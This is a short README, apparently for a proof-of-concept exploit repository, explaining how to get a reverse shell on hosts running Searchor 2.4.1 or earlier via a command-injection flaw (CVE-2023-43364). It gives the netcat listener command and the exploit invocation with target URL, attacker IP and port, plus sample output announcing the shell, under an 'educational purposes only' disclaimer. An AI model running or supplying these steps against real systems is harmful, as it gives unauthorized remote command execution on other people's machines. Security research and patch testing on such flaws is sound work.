# Searchor-2.4.0-Arbitrary-CMD-Injection-Python
Reverse shell exploit for Searchor &lt;=2.4.1

## How to get reverse shell
1. Start netcat listener of your host machine.
```
nc -nvlp 8888
```
2. Run the exploit.
```
python3 CVE-2023-43364.py -u http://example.com/ -rh 10.10.10.11 -rp 8888
Connection Established Successfully.
Trying to open a reverse shell on 10.10.10.11 at 8888...
```

## Disclaimer
This POC was created for educational purposes only.
